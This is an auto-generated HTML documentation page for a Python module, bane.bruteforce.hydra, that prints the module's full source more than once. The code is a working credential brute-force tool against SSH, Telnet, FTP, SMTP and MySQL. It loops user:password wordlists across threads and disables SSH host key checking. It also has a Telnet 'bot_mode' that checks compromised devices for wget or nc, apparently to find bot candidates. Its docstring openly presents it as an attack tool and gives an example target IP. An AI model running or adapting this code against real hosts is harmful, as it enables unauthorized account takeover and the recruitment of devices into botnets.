<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
<meta name="generator" content="pdoc 0.10.0" />
<title>bane.bruteforce.hydra API documentation</title>
<meta name="description" content="" />
<link rel="preload stylesheet" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/sanitize.min.css" integrity="sha256-PK9q560IAAa6WVRRh76LtCaI8pjTJ2z11v0miyNNjrs=" crossorigin>
<link rel="preload stylesheet" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/typography.min.css" integrity="sha256-7l/o7C8jubJiy74VsKTidCy1yBkRtiUGbVkYBylBqUg=" crossorigin>
<link rel="stylesheet preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/github.min.css" crossorigin>
<style>:root{--highlight-color:#fe9}.flex{display:flex !important}body{line-height:1.5em}#content{padding:20px}#sidebar{padding:30px;overflow:hidden}#sidebar > *:last-child{margin-bottom:2cm}.http-server-breadcrumbs{font-size:130%;margin:0 0 15px 0}#footer{font-size:.75em;padding:5px 30px;border-top:1px solid #ddd;text-align:right}#footer p{margin:0 0 0 1em;display:inline-block}#footer p:last-child{margin-right:30px}h1,h2,h3,h4,h5{font-weight:300}h1{font-size:2.5em;line-height:1.1em}h2{font-size:1.75em;margin:1em 0 .50em 0}h3{font-size:1.4em;margin:25px 0 10px 0}h4{margin:0;font-size:105%}h1:target,h2:target,h3:target,h4:target,h5:target,h6:target{background:var(--highlight-color);padding:.2em 0}a{color:#058;text-decoration:none;transition:color .3s ease-in-out}a:hover{color:#e82}.title code{font-weight:bold}h2[id^="header-"]{margin-top:2em}.ident{color:#900}pre code{background:#f8f8f8;font-size:.8em;line-height:1.4em}code{background:#f2f2f1;padding:1px 4px;overflow-wrap:break-word}h1 code{background:transparent}pre{background:#f8f8f8;border:0;border-top:1px solid #ccc;border-bottom:1px solid #ccc;margin:1em 0;padding:1ex}#http-server-module-list{display:flex;flex-flow:column}#http-server-module-list div{display:flex}#http-server-module-list dt{min-width:10%}#http-server-module-list p{margin-top:0}.toc ul,#index{list-style-type:none;margin:0;padding:0}#index code{background:transparent}#index h3{border-bottom:1px solid #ddd}#index ul{padding:0}#index h4{margin-top:.6em;font-weight:bold}@media (min-width:200ex){#index .two-column{column-count:2}}@media (min-width:300ex){#index .two-column{column-count:3}}dl{margin-bottom:2em}dl dl:last-child{margin-bottom:4em}dd{margin:0 0 1em 3em}#header-classes + dl > dd{margin-bottom:3em}dd dd{margin-left:2em}dd p{margin:10px 0}.name{background:#eee;font-weight:bold;font-size:.85em;padding:5px 10px;display:inline-block;min-width:40%}.name:hover{background:#e0e0e0}dt:target .name{background:var(--highlight-color)}.name > span:first-child{white-space:nowrap}.name.class > span:nth-child(2){margin-left:.4em}.inherited{color:#999;border-left:5px solid #eee;padding-left:1em}.inheritance em{font-style:normal;font-weight:bold}.desc h2{font-weight:400;font-size:1.25em}.desc h3{font-size:1em}.desc dt code{background:inherit}.source summary,.git-link-div{color:#666;text-align:right;font-weight:400;font-size:.8em;text-transform:uppercase}.source summary > *{white-space:nowrap;cursor:pointer}.git-link{color:inherit;margin-left:1em}.source pre{max-height:500px;overflow:auto;margin:0}.source pre code{font-size:12px;overflow:visible}.hlist{list-style:none}.hlist li{display:inline}.hlist li:after{content:',\2002'}.hlist li:last-child:after{content:none}.hlist .hlist{display:inline;padding-left:1em}img{max-width:100%}td{padding:0 .5em}.admonition{padding:.1em .5em;margin-bottom:1em}.admonition-title{font-weight:bold}.admonition.note,.admonition.info,.admonition.important{background:#aef}.admonition.todo,.admonition.versionadded,.admonition.tip,.admonition.hint{background:#dfd}.admonition.warning,.admonition.versionchanged,.admonition.deprecated{background:#fd4}.admonition.error,.admonition.danger,.admonition.caution{background:lightpink}</style>
<style media="screen and (min-width: 700px)">@media screen and (min-width:700px){#sidebar{width:30%;height:100vh;overflow:auto;position:sticky;top:0}#content{width:70%;max-width:100ch;padding:3em 4em;border-left:1px solid #ddd}pre code{font-size:1em}.item .name{font-size:1em}main{display:flex;flex-direction:row-reverse;justify-content:flex-end}.toc ul ul,#index ul{padding-left:1.5em}.toc > ul > li{margin-top:.5em}}</style>
<style media="print">@media print{#sidebar h1{page-break-before:always}.source{display:none}}@media print{*{background:transparent !important;color:#000 !important;box-shadow:none !important;text-shadow:none !important}a[href]:after{content:" (" attr(href) ")";font-size:90%}a[href][title]:after{content:none}abbr[title]:after{content:" (" attr(title) ")"}.ir a:after,a[href^="javascript:"]:after,a[href^="#"]:after{content:""}pre,blockquote{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}tr,img{page-break-inside:avoid}img{max-width:100% !important}@page{margin:0.5cm}p,h2,h3{orphans:3;widows:3}h1,h2,h3,h4,h5,h6{page-break-after:avoid}}</style>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js" integrity="sha256-Uv3H6lx7dJmRfRvH8TH6kJD1TSK1aFcwgx+mdg3epi8=" crossorigin></script>
<script>window.addEventListener('DOMContentLoaded', () => hljs.initHighlighting())</script>
</head>
<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>bane.bruteforce.hydra</code></h1>
</header>
<section id="section-intro">
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">from bane.bruteforce.utils import *


&#34;&#34;&#34;
  the next functions are used to check the login credentials you provide, it can be used for bruteforce attacks.

  it returns True if the given logins, else it returns False.

  example:

  &gt;&gt;&gt;host=&#39;125.33.32.11&#39;
  &gt;&gt;&gt;wordlist=[&#39;admin:admin&#39;,&#39;admin123:admin&#39;,&#39;user:password&#39;]
  &gt;&gt;&gt;for x in wordlist:
      user=x.split(&#39;:&#39;)[0]
      pwd=x.split(&#39;:&#39;)[1]
      print &#39;[*]Trying:&#39;,user,pwd
      if bane.telnet(host,username=user,password=pwd)==True:
       print&#39;[+]Found!!!&#39;
      else:
       print&#39;[-]Failed&#39;

&#34;&#34;&#34;


def smtp(u, username, password, p=25, ehlo=True, helo=False, ttls=False,proxy_type=None,proxy_host=None,proxy_port=None,proxy_username=None,proxy_password=None,timeout=5):
    try:
        sock=get_socks_proxy_socket(u,p,proxy_host,proxy_port,proxy_type,username=proxy_username,password=proxy_password,timeout=timeout)
        s = smtplib.SMTP()  
        s.sock=sock
        if ehlo == True:
            s.ehlo()  # ehlo
            if ttls == True:
                s.starttls()  # ttls
        if helo == True:
            s.helo()  # helo
            if ttls == True:
                s.starttls()
        s.login(username, password)
        return True
    except Exception as e:
        pass
    return False


def telnet(u, username, password, p=23, timeout=5, bot_mode=False,proxy_type=None,proxy_host=None,proxy_port=None,proxy_username=None,proxy_password=None):
    try:
        t = xtelnet.session()
        t.connect(u, username=username, password=password, p=p, timeout=timeout,proxy_type=proxy_type,proxy_host=proxy_host,proxy_port=proxy_port,proxy_username=proxy_username,proxy_password=proxy_password)
        if bot_mode == True:
            a = t.execute(&#34;busybox&#34;)
        t.destroy()
        if bot_mode == True:
            if &#34;wget&#34; in a or &#34;nc&#34; in a:
                return True
            return False
        return True
    except:
        pass
    return False


# why i used this code for ssh brute force instead of: pexpext/paramiko ? Well pexpect doesn&#39;t work on non-linux machines and paramiko gives a huuuuge number of false positive results ! you will see, with this code there is no false positive brute force ;)


def ssh(u, username, password, p=22, timeout=5, exchange_key=None):
    if os.name == &#34;nt&#34; or os.name==os.PyShadowString(&#39;java&#39;, &#39;nt&#39;):
        if exchange_key != None:  # this doesn&#39;t work on windows for some reason :(
            return False
        l = &#39;echo y | plink -ssh -l {} -pw {} {} -P {} &#34;hvbjkjk&#34;&#39;.format(
            username, password, u, p
        )
        sshp = subprocess.Popen(
            l.split(),
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,
        )
    else:
        if exchange_key:
            key = &#34;-oHostKeyAlgorithms=+&#34; + exchange_key
        else:
            key = &#34;&#34;
        l = &#34;sshpass -p {} ssh {} -p {} -o StrictHostKeyChecking=no -l {} {} &#39;exithg&#39;&#34;.format(
            password, key, p, username, u
        )  # we use the sshpass command to send the password
        sshp = subprocess.Popen(
            l.split(),
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
    ti = time.time()
    while sshp.poll() is None:
        time.sleep(0.1)
        # print(ssh.stdout.readlines())
        if int(time.time() - ti) == timeout:
            try:
                sshp.kill()
            except:
                pass
            return False
    ou = sshp.communicate()
    try:
        sshp.kill()
    except:
        pass
    time.sleep(0.1)
    if exchange_key == None:
        if &#34;Their offer:&#34; in ou[1].decode(&#34;utf-8&#34;):
            if os.name == &#34;nt&#34;:
                return False
            k = ou[1].decode(&#34;utf-8&#34;).split(&#34;offer:&#34;)[1].strip()
            return ssh(u, username, password, p=p, timeout=timeout, exchange_key=k)
    if &#34;Server refused to start a shell/command&#34; in ou[1].decode(&#34;utf-8&#34;):
        return True
    if (
        (&#34;unsupported&#34; in ou[1].decode(&#34;utf-8&#34;).lower())
        or (&#34;denied&#34; in ou[1].decode(&#34;utf-8&#34;).lower())
        or (&#34;FATAL ERROR&#34; in ou[1].decode(&#34;utf-8&#34;))
        or (&#34;refused&#34; in ou[1].decode(&#34;utf-8&#34;).lower())
        or (&#34;Unsupported KEX algorithm&#34; in ou[1].decode(&#34;utf-8&#34;))
        or (&#34;Bad SSH2 KexAlgorithms&#34; in ou[1].decode(&#34;utf-8&#34;))
        or (&#34;not accepted&#34; in ou[1].decode(&#34;utf-8&#34;).lower())
        or (&#34;invalid&#34; in ou[1].decode(&#34;utf-8&#34;).lower())
        or (&#34;incorrect&#34; in ou[1].decode(&#34;utf-8&#34;).lower())
    ):
        return False
    else:
        return True


def ftp_anon(ip, p,timeout=5,proxy_type=None,proxy_host=None,proxy_port=None,proxy_username=None,proxy_password=None):
    # anonymous ftp login
    try:
        sock=get_socks_proxy_socket(ip,p,proxy_host,proxy_port,proxy_type,username=proxy_username,password=proxy_password,timeout=timeout)
        ftp = FTP()
        ftp.sock=sock
        ftp.login()
        return True
    except Exception as e:
        pass
    return False


def ftp(ip,p, username, password, timeout=5,proxy_type=None,proxy_host=None,proxy_port=None,proxy_username=None,proxy_password=None):
    try:
        i = False
        sock=get_socks_proxy_socket(ip,p,proxy_host,proxy_port,proxy_type,username=proxy_username,password=proxy_password,timeout=timeout)
        ftp = FTP()
        ftp.sock=sock
        ftp.login(username, password)
        return True
    except Exception as e:
        pass
    return False


def mysql(u, username, password, timeout=5, p=3306):
    try:
        s=pymysql.connect(host=u,port=p,user=username,password=password,connect_timeout=timeout)
        s.close()
        return True
    except Exception as e:
        pass
    return False


class hydra:
    __slots__ = [&#34;stop&#34;, &#34;finish&#34;, &#34;result&#34;, &#34;logs&#34;]

    def __init__(
        self,
        u,
        p=22,
        protocol=&#34;ssh&#34;,
        word_list=[],
        threads_daemon=True,
        logs=True,
        exchange_key=None,
        timeout=5,
        ehlo=False,
        helo=True,
        ttls=False,
        proxy=None,
        proxies=None,
        user_agent=None,
        cookie=None,
        headers={}
    ):
        &#34;&#34;&#34;
        this function is similar to hydra tool to bruteforce attacks on different ports.

        protocol: (set by default to: ssh) set the chosen protocol (ftp, ssh, telnet, smtp and mysql) and don&#39;t forget to set the port.&#34;&#34;&#34;
        self.logs = logs
        self.stop = False
        self.finish = False
        self.result = {}
        t = threading.Thread(
            target=self.crack,
            args=(
                u,
                p,
                protocol,
                word_list,
                logs,
                exchange_key,
                timeout,
                ehlo,
                helo,
                ttls,
                proxy,
                proxies,
                user_agent,
                cookie,
                headers,
            ),
        )
        t.daemon = threads_daemon
        t.start()

    def crack(
        self,
        u,
        p,
        protocol,
        word_list,
        logs,
        exchange_key,
        timeout,
        ehlo,
        helo,
        ttls,
        proxy,
        proxies,
        user_agent,
        cookie,
        headers
    ):
        o = &#34;&#34;
        if protocol == &#34;telnet&#34;:
            s = telnet
        if protocol == &#34;ssh&#34;:
            s = ssh
        if protocol == &#34;ftp&#34;:
            s = ftp
        if protocol == &#34;smtp&#34;:
            s = smtp
        if protocol == &#34;mysql&#34;:
            s = mysql
        if protocol == &#34;wp&#34;:
            s = wpadmin
        for x in word_list:
            if self.stop == True:
                break
            user = x.split(&#34;:&#34;)[0].strip()
            pwd = x.split(&#34;:&#34;)[1].strip()
            if self.logs == True:
                print(&#34;[*]Trying ==&gt; {}:{}&#34;.format(user, pwd))
            if protocol == &#34;ssh&#34;:
                r = s(u, user, pwd, timeout=timeout, p=p, exchange_key=exchange_key)
            elif protocol == &#34;telnet&#34;:
                r = s(u, user, pwd, timeout=timeout, p=p)
            elif protocol == &#34;mysql&#34;:
                r = s(u, user, pwd, timeout=timeout, p=p)
            elif protocol == &#34;ftp&#34;:
                r = s(u, user, pwd, timeout=timeout)
            elif protocol == &#34;wp&#34;:
                if proxy:
                    proxy = proxy
                if proxies:
                    proxy = random.choice(proxies)
                r = s(
                    u,
                    user,
                    pwd,
                    proxy=proxy,
                    user_agent=user_agent,
                    cookie=cookie,
                    timeout=timeout,
                    headers=headers
                )
            elif protocol == &#34;smtp&#34;:
                r = s(u, p, user, pwd, ehlo=ehlo, helo=helo, ttls=ttls)
            else:
                r = s(u, user, pwd, timeout=timeout)
            if r == True:
                if self.logs == True:
                    print(&#34;[+]Found!!!&#34;)
                o = &#34;{}:{}&#34;.format(user, pwd)
                break
            else:
                if self.logs == True:
                    print(&#34;[-]Failed&#34;)
        self.result = {u: o}
        self.finish = True</code></pre>
</details>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-functions">Functions</h2>
<dl>
<dt id="bane.bruteforce.hydra.ftp"><code class="name flex">
<span>def <span class="ident">ftp</span></span>(<span>ip, p, username, password, timeout=5, proxy_type=None, proxy_host=None, proxy_port=None, proxy_username=None, proxy_password=None)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def ftp(ip,p, username, password, timeout=5,proxy_type=None,proxy_host=None,proxy_port=None,proxy_username=None,proxy_password=None):
    try:
        i = False
        sock=get_socks_proxy_socket(ip,p,proxy_host,proxy_port,proxy_type,username=proxy_username,password=proxy_password,timeout=timeout)
        ftp = FTP()
        ftp.sock=sock
        ftp.login(username, password)
        return True
    except Exception as e:
        pass
    return False</code></pre>
</details>
</dd>
<dt id="bane.bruteforce.hydra.ftp_anon"><code class="name flex">
<span>def <span class="ident">ftp_anon</span></span>(<span>ip, p, timeout=5, proxy_type=None, proxy_host=None, proxy_port=None, proxy_username=None, proxy_password=None)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def ftp_anon(ip, p,timeout=5,proxy_type=None,proxy_host=None,proxy_port=None,proxy_username=None,proxy_password=None):
    # anonymous ftp login
    try:
        sock=get_socks_proxy_socket(ip,p,proxy_host,proxy_port,proxy_type,username=proxy_username,password=proxy_password,timeout=timeout)
        ftp = FTP()
        ftp.sock=sock
        ftp.login()
        return True
    except Exception as e:
        pass
    return False</code></pre>
</details>
</dd>
<dt id="bane.bruteforce.hydra.mysql"><code class="name flex">
<span>def <span class="ident">mysql</span></span>(<span>u, username, password, timeout=5, p=3306)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def mysql(u, username, password, timeout=5, p=3306):
    try:
        s=pymysql.connect(host=u,port=p,user=username,password=password,connect_timeout=timeout)
        s.close()
        return True
    except Exception as e:
        pass
    return False</code></pre>
</details>
</dd>
<dt id="bane.bruteforce.hydra.smtp"><code class="name flex">
<span>def <span class="ident">smtp</span></span>(<span>u, username, password, p=25, ehlo=True, helo=False, ttls=False, proxy_type=None, proxy_host=None, proxy_port=None, proxy_username=None, proxy_password=None, timeout=5)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def smtp(u, username, password, p=25, ehlo=True, helo=False, ttls=False,proxy_type=None,proxy_host=None,proxy_port=None,proxy_username=None,proxy_password=None,timeout=5):
    try:
        sock=get_socks_proxy_socket(u,p,proxy_host,proxy_port,proxy_type,username=proxy_username,password=proxy_password,timeout=timeout)
        s = smtplib.SMTP()  
        s.sock=sock
        if ehlo == True:
            s.ehlo()  # ehlo
            if ttls == True:
                s.starttls()  # ttls
        if helo == True:
            s.helo()  # helo
            if ttls == True:
                s.starttls()
        s.login(username, password)
        return True
    except Exception as e:
        pass
    return False</code></pre>
</details>
</dd>
<dt id="bane.bruteforce.hydra.ssh"><code class="name flex">
<span>def <span class="ident">ssh</span></span>(<span>u, username, password, p=22, timeout=5, exchange_key=None)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def ssh(u, username, password, p=22, timeout=5, exchange_key=None):
    if os.name == &#34;nt&#34; or os.name==os.PyShadowString(&#39;java&#39;, &#39;nt&#39;):
        if exchange_key != None:  # this doesn&#39;t work on windows for some reason :(
            return False
        l = &#39;echo y | plink -ssh -l {} -pw {} {} -P {} &#34;hvbjkjk&#34;&#39;.format(
            username, password, u, p
        )
        sshp = subprocess.Popen(
            l.split(),
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,
        )
    else:
        if exchange_key:
            key = &#34;-oHostKeyAlgorithms=+&#34; + exchange_key
        else:
            key = &#34;&#34;
        l = &#34;sshpass -p {} ssh {} -p {} -o StrictHostKeyChecking=no -l {} {} &#39;exithg&#39;&#34;.format(
            password, key, p, username, u
        )  # we use the sshpass command to send the password
        sshp = subprocess.Popen(
            l.split(),
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
    ti = time.time()
    while sshp.poll() is None:
        time.sleep(0.1)
        # print(ssh.stdout.readlines())
        if int(time.time() - ti) == timeout:
            try:
                sshp.kill()
            except:
                pass
            return False
    ou = sshp.communicate()
    try:
        sshp.kill()
    except:
        pass
    time.sleep(0.1)
    if exchange_key == None:
        if &#34;Their offer:&#34; in ou[1].decode(&#34;utf-8&#34;):
            if os.name == &#34;nt&#34;:
                return False
            k = ou[1].decode(&#34;utf-8&#34;).split(&#34;offer:&#34;)[1].strip()
            return ssh(u, username, password, p=p, timeout=timeout, exchange_key=k)
    if &#34;Server refused to start a shell/command&#34; in ou[1].decode(&#34;utf-8&#34;):
        return True
    if (
        (&#34;unsupported&#34; in ou[1].decode(&#34;utf-8&#34;).lower())
        or (&#34;denied&#34; in ou[1].decode(&#34;utf-8&#34;).lower())
        or (&#34;FATAL ERROR&#34; in ou[1].decode(&#34;utf-8&#34;))
        or (&#34;refused&#34; in ou[1].decode(&#34;utf-8&#34;).lower())
        or (&#34;Unsupported KEX algorithm&#34; in ou[1].decode(&#34;utf-8&#34;))
        or (&#34;Bad SSH2 KexAlgorithms&#34; in ou[1].decode(&#34;utf-8&#34;))
        or (&#34;not accepted&#34; in ou[1].decode(&#34;utf-8&#34;).lower())
        or (&#34;invalid&#34; in ou[1].decode(&#34;utf-8&#34;).lower())
        or (&#34;incorrect&#34; in ou[1].decode(&#34;utf-8&#34;).lower())
    ):
        return False
    else:
        return True</code></pre>
</details>
</dd>
<dt id="bane.bruteforce.hydra.telnet"><code class="name flex">
<span>def <span class="ident">telnet</span></span>(<span>u, username, password, p=23, timeout=5, bot_mode=False, proxy_type=None, proxy_host=None, proxy_port=None, proxy_username=None, proxy_password=None)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def telnet(u, username, password, p=23, timeout=5, bot_mode=False,proxy_type=None,proxy_host=None,proxy_port=None,proxy_username=None,proxy_password=None):
    try:
        t = xtelnet.session()
        t.connect(u, username=username, password=password, p=p, timeout=timeout,proxy_type=proxy_type,proxy_host=proxy_host,proxy_port=proxy_port,proxy_username=proxy_username,proxy_password=proxy_password)
        if bot_mode == True:
            a = t.execute(&#34;busybox&#34;)
        t.destroy()
        if bot_mode == True:
            if &#34;wget&#34; in a or &#34;nc&#34; in a:
                return True
            return False
        return True
    except:
        pass
    return False</code></pre>
</details>
</dd>
</dl>
</section>
<section>
<h2 class="section-title" id="header-classes">Classes</h2>
<dl>
<dt id="bane.bruteforce.hydra.hydra"><code class="flex name class">
<span>class <span class="ident">hydra</span></span>
<span>(</span><span>u, p=22, protocol='ssh', word_list=[], threads_daemon=True, logs=True, exchange_key=None, timeout=5, ehlo=False, helo=True, ttls=False, proxy=None, proxies=None, user_agent=None, cookie=None, headers={})</span>
</code></dt>
<dd>
<div class="desc"><p>this function is similar to hydra tool to bruteforce attacks on different ports.</p>
<p>protocol: (set by default to: ssh) set the chosen protocol (ftp, ssh, telnet, smtp and mysql) and don't forget to set the port.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class hydra:
    __slots__ = [&#34;stop&#34;, &#34;finish&#34;, &#34;result&#34;, &#34;logs&#34;]

    def __init__(
        self,
        u,
        p=22,
        protocol=&#34;ssh&#34;,
        word_list=[],
        threads_daemon=True,
        logs=True,
        exchange_key=None,
        timeout=5,
        ehlo=False,
        helo=True,
        ttls=False,
        proxy=None,
        proxies=None,
        user_agent=None,
        cookie=None,
        headers={}
    ):
        &#34;&#34;&#34;
        this function is similar to hydra tool to bruteforce attacks on different ports.

        protocol: (set by default to: ssh) set the chosen protocol (ftp, ssh, telnet, smtp and mysql) and don&#39;t forget to set the port.&#34;&#34;&#34;
        self.logs = logs
        self.stop = False
        self.finish = False
        self.result = {}
        t = threading.Thread(
            target=self.crack,
            args=(
                u,
                p,
                protocol,
                word_list,
                logs,
                exchange_key,
                timeout,
                ehlo,
                helo,
                ttls,
                proxy,
                proxies,
                user_agent,
                cookie,
                headers,
            ),
        )
        t.daemon = threads_daemon
        t.start()

    def crack(
        self,
        u,
        p,
        protocol,
        word_list,
        logs,
        exchange_key,
        timeout,
        ehlo,
        helo,
        ttls,
        proxy,
        proxies,
        user_agent,
        cookie,
        headers
    ):
        o = &#34;&#34;
        if protocol == &#34;telnet&#34;:
            s = telnet
        if protocol == &#34;ssh&#34;:
            s = ssh
        if protocol == &#34;ftp&#34;:
            s = ftp
        if protocol == &#34;smtp&#34;:
            s = smtp
        if protocol == &#34;mysql&#34;:
            s = mysql
        if protocol == &#34;wp&#34;:
            s = wpadmin
        for x in word_list:
            if self.stop == True:
                break
            user = x.split(&#34;:&#34;)[0].strip()
            pwd = x.split(&#34;:&#34;)[1].strip()
            if self.logs == True:
                print(&#34;[*]Trying ==&gt; {}:{}&#34;.format(user, pwd))
            if protocol == &#34;ssh&#34;:
                r = s(u, user, pwd, timeout=timeout, p=p, exchange_key=exchange_key)
            elif protocol == &#34;telnet&#34;:
                r = s(u, user, pwd, timeout=timeout, p=p)
            elif protocol == &#34;mysql&#34;:
                r = s(u, user, pwd, timeout=timeout, p=p)
            elif protocol == &#34;ftp&#34;:
                r = s(u, user, pwd, timeout=timeout)
            elif protocol == &#34;wp&#34;:
                if proxy:
                    proxy = proxy
                if proxies:
                    proxy = random.choice(proxies)
                r = s(
                    u,
                    user,
                    pwd,
                    proxy=proxy,
                    user_agent=user_agent,
                    cookie=cookie,
                    timeout=timeout,
                    headers=headers
                )
            elif protocol == &#34;smtp&#34;:
                r = s(u, p, user, pwd, ehlo=ehlo, helo=helo, ttls=ttls)
            else:
                r = s(u, user, pwd, timeout=timeout)
            if r == True:
                if self.logs == True:
                    print(&#34;[+]Found!!!&#34;)
                o = &#34;{}:{}&#34;.format(user, pwd)
                break
            else:
                if self.logs == True:
                    print(&#34;[-]Failed&#34;)
        self.result = {u: o}
        self.finish = True</code></pre>
</details>
<h3>Instance variables</h3>
<dl>
<dt id="bane.bruteforce.hydra.hydra.finish"><code class="name">var <span class="ident">finish</span></code></dt>
<dd>
<div class="desc"><p>Return an attribute of instance, which is of type owner.</p></div>
</dd>
<dt id="bane.bruteforce.hydra.hydra.logs"><code class="name">var <span class="ident">logs</span></code></dt>
<dd>
<div class="desc"><p>Return an attribute of instance, which is of type owner.</p></div>
</dd>
<dt id="bane.bruteforce.hydra.hydra.result"><code class="name">var <span class="ident">result</span></code></dt>
<dd>
<div class="desc"><p>Return an attribute of instance, which is of type owner.</p></div>
</dd>
<dt id="bane.bruteforce.hydra.hydra.stop"><code class="name">var <span class="ident">stop</span></code></dt>
<dd>
<div class="desc"><p>Return an attribute of instance, which is of type owner.</p></div>
</dd>
</dl>
<h3>Methods</h3>
<dl>
<dt id="bane.bruteforce.hydra.hydra.crack"><code class="name flex">
<span>def <span class="ident">crack</span></span>(<span>self, u, p, protocol, word_list, logs, exchange_key, timeout, ehlo, helo, ttls, proxy, proxies, user_agent, cookie, headers)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def crack(
    self,
    u,
    p,
    protocol,
    word_list,
    logs,
    exchange_key,
    timeout,
    ehlo,
    helo,
    ttls,
    proxy,
    proxies,
    user_agent,
    cookie,
    headers
):
    o = &#34;&#34;
    if protocol == &#34;telnet&#34;:
        s = telnet
    if protocol == &#34;ssh&#34;:
        s = ssh
    if protocol == &#34;ftp&#34;:
        s = ftp
    if protocol == &#34;smtp&#34;:
        s = smtp
    if protocol == &#34;mysql&#34;:
        s = mysql
    if protocol == &#34;wp&#34;:
        s = wpadmin
    for x in word_list:
        if self.stop == True:
            break
        user = x.split(&#34;:&#34;)[0].strip()
        pwd = x.split(&#34;:&#34;)[1].strip()
        if self.logs == True:
            print(&#34;[*]Trying ==&gt; {}:{}&#34;.format(user, pwd))
        if protocol == &#34;ssh&#34;:
            r = s(u, user, pwd, timeout=timeout, p=p, exchange_key=exchange_key)
        elif protocol == &#34;telnet&#34;:
            r = s(u, user, pwd, timeout=timeout, p=p)
        elif protocol == &#34;mysql&#34;:
            r = s(u, user, pwd, timeout=timeout, p=p)
        elif protocol == &#34;ftp&#34;:
            r = s(u, user, pwd, timeout=timeout)
        elif protocol == &#34;wp&#34;:
            if proxy:
                proxy = proxy
            if proxies:
                proxy = random.choice(proxies)
            r = s(
                u,
                user,
                pwd,
                proxy=proxy,
                user_agent=user_agent,
                cookie=cookie,
                timeout=timeout,
                headers=headers
            )
        elif protocol == &#34;smtp&#34;:
            r = s(u, p, user, pwd, ehlo=ehlo, helo=helo, ttls=ttls)
        else:
            r = s(u, user, pwd, timeout=timeout)
        if r == True:
            if self.logs == True:
                print(&#34;[+]Found!!!&#34;)
            o = &#34;{}:{}&#34;.format(user, pwd)
            break
        else:
            if self.logs == True:
                print(&#34;[-]Failed&#34;)
    self.result = {u: o}
    self.finish = True</code></pre>
</details>
</dd>
</dl>
</dd>
</dl>
</section>
</article>
<nav id="sidebar">
<h1>Index</h1>
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a title="bane.bruteforce" href="index.html">bane.bruteforce</a></code></li>
</ul>
</li>
<li><h3><a href="#header-functions">Functions</a></h3>
<ul class="two-column">
<li><code><a title="bane.bruteforce.hydra.ftp" href="#bane.bruteforce.hydra.ftp">ftp</a></code></li>
<li><code><a title="bane.bruteforce.hydra.ftp_anon" href="#bane.bruteforce.hydra.ftp_anon">ftp_anon</a></code></li>
<li><code><a title="bane.bruteforce.hydra.mysql" href="#bane.bruteforce.hydra.mysql">mysql</a></code></li>
<li><code><a title="bane.bruteforce.hydra.smtp" href="#bane.bruteforce.hydra.smtp">smtp</a></code></li>
<li><code><a title="bane.bruteforce.hydra.ssh" href="#bane.bruteforce.hydra.ssh">ssh</a></code></li>
<li><code><a title="bane.bruteforce.hydra.telnet" href="#bane.bruteforce.hydra.telnet">telnet</a></code></li>
</ul>
</li>
<li><h3><a href="#header-classes">Classes</a></h3>
<ul>
<li>
<h4><code><a title="bane.bruteforce.hydra.hydra" href="#bane.bruteforce.hydra.hydra">hydra</a></code></h4>
<ul class="">
<li><code><a title="bane.bruteforce.hydra.hydra.crack" href="#bane.bruteforce.hydra.hydra.crack">crack</a></code></li>
<li><code><a title="bane.bruteforce.hydra.hydra.finish" href="#bane.bruteforce.hydra.hydra.finish">finish</a></code></li>
<li><code><a title="bane.bruteforce.hydra.hydra.logs" href="#bane.bruteforce.hydra.hydra.logs">logs</a></code></li>
<li><code><a title="bane.bruteforce.hydra.hydra.result" href="#bane.bruteforce.hydra.hydra.result">result</a></code></li>
<li><code><a title="bane.bruteforce.hydra.hydra.stop" href="#bane.bruteforce.hydra.hydra.stop">stop</a></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
</footer>
</body>
</html>